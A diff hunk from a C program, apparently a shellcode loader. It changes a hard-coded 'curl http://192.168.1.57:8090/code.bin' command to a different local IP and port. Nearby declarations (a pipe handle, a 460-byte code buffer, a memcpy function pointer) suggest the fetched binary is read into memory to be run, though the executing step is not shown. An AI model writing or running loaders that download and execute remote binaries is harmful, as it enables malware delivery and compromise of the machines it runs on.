@@ -53,7 +53,7 @@ int main() {
     void *(*f5)(void *, const void *, size_t) = memcpy;
 
     FILE *fpipe;
-    char *command = "curl http://192.168.1.57:8090/code.bin";
+    char *command = "curl http://192.168.1.1:8080/code.bin";
     char c = 0;
     unsigned char code[460];
     int counter = 0;
